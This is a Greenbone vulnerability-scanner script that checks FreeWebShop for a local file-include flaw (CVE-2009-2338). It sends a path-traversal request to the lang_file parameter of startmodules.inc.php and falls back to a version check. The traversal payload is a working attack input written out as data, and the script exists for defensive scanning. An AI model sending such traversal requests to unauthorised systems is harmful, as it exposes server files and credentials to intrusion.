# SPDX-FileCopyrightText: 2009 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:freewebshop:freewebshop";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100236");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2009-07-21 20:55:39 +0200 (Tue, 21 Jul 2009)");
  script_cve_id("CVE-2009-2338");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");

  script_name("FreeWebShop 'startmodules.inc.php' Local File Include Vulnerability");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_banner");
  script_tag(name:"solution_type", value:"WillNotFix");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2009 Greenbone AG");
  script_dependencies("FreeWebShop_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("FreeWebshop/installed");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to
  a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"FreeWebShop is prone to a local file-include vulnerability because it
  fails to properly sanitize user-supplied input.");

  script_tag(name:"impact", value:"An attacker can exploit this vulnerability to view and execute
  arbitrary local files in the context of the webserver process. This may aid in further attacks.");

  script_tag(name:"affected", value:"FreeWebShop 2.2.9 R2 is vulnerable, other versions may also be
  affected.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/34538");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("os_func.inc");
include("version_func.inc");
include("misc_func.inc");
include("traversal_func.inc");

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!infos = get_app_version_and_location( cpe:CPE, port:port, exit_no_version:FALSE)) exit(0);

dir = infos["location"];

files = traversal_files();

if(!isnull(dir)) {
  if (dir == "/")
    dir = "";

  foreach pattern (keys(files)) {

    file = files[pattern];

    url = dir + "/includes/startmodules.inc.php?lang_file=../../../../../../../../../../../../" + file;
    req = http_get(item:url, port:port);
    buf = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

    if (egrep(pattern:pattern, string: buf)) {
      report = http_report_vuln_url(port: port, url: url);
      security_message(port: port, data: report);
      exit(0);
    }
  }
}

# file include fail. But we should inform anyway about the Vulnerability if version <=2.2.9_R2.
vers = infos["version"];

if(vers && "unknown" >!< vers) {
  vers = str_replace(find:"_", string: vers, replace:".");
  if(version_is_less_equal(version: vers, test_version: "2.2.9.R2", icase:TRUE)) {
    report = report_fixed_ver(installed_version: vers, fixed_version: "None", install_url: dir);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
